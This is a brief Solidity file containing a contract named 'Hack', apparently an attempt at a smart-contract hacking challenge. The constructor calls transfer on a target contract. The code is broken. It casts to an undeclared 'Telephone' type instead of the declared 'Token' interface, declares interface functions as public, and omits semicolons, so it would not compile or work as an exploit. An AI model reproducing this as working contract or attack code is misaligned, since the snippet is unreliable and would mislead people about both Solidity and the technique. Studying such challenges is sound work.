pragma solidity ^0.8.0;

interface Token {
function balanceOf(address _) public view returns (uint256)
function transfer(address _to, uint256 _value) public returns (bool)
}

contract Hack {
  constructor(address _target){
   Telephone(_target).transfer(msg.sender,1);
  }
}
